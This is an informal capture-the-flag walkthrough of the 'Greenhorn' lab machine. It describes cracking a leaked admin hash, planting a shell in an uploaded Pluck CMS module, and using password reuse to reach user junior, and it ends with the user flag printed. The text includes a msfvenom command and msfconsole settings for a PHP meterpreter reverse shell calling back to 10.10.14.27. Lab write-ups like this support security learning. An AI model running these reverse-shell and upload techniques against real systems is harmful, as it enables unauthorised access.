At port 80 we have a pluck application 
On first analysis i cant find a exploit for that.

At port 3000 we have an git repository server powered by gitea
i found a repository of the application on port 80

The repository has a file called pass.php
this file has the hash:

d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163

this hash is a sha 512 of the strig:

iloveyou1

this string can be the master admin password

i logged on admin pluck plaform.
We can upload a module for pluck.
I dowloaded a test module and inject a shell on this module.
With this shell i logged on machine as www-data user.

i founded the user.txt file on folder /home/junior  but i havent permission to read

i used msfvenon to create a backdoor, i uploaded a new shell and used msfconsole to exploit.

terminal:
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=9001 -f raw -o shell.php LPORT=9001 -f raw -o shell.php


msfconsole:
set LHOST 10.10.14.27
set LPORT 9001
set PAYLOAD php/meterpreter/reverse_tcp
exploit

i ran the url :
http://greenhorn.htb/data/modules/simple/shell.php

and the backdoor exploit was executed with success

tried the recon
multi/recon/local_exploit_suggester .... nothing founded


I ran the linpeas script...nothing

i tried to use the pluck admin password with junior user:

command `su - junior`

used the password iloveyou1

booooom


cd /home/junior
cat user.txt
6a726a101baa431fced0240a747825af



